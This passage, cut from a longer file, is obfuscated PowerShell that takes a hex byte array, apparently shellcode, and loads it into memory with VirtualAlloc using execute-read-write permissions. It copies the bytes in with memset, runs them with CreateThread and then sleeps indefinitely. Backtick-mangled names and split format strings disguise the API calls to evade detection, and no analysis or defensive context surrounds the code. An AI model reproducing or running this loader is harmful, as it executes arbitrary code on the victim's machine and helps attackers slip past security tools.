07,0x75,0x5e,0x88,0x9d,0x36,0x08,0xf5,0x71,0xb7,0xc8,0xa3,0x1b,0xb7,0xa0,0x13,0x78,0xe4,0xd5,0x5b,0x55,0x98,0x46,0xce,0x56,0xc9,0x3b,0x59,0x3f,0xf7,0x62,0xad,0xe0,0x08,0x41,0x2f,0xdc,0xde,0xaf,0x45,0x0c,0xe3;${g} = 0x1000;if (${z}."Le`Ngth" -gt 0x1000){${g} = ${z}."l`eN`gTH"};${x}=${W}::("{2}{0}{1}"-f 'All','oc','Virtual').Invoke(0,0x1000,${G},0x40);for (${I}=0;${I} -le (${Z}."leN`GTh"-1);${i}++) {${w}::"m`e`mSEt"([IntPtr](${X}.("{1}{0}" -f 'Int32','To').Invoke()+${i}), ${Z}[${i}], 1)};${W}::("{2}{0}{1}{3}" -f 'r','eateThr','C','ead').Invoke(0,0,${x},0,0,0);for (;;){&("{0}{1}{2}" -f 'Sta','rt-sle','ep') 60};
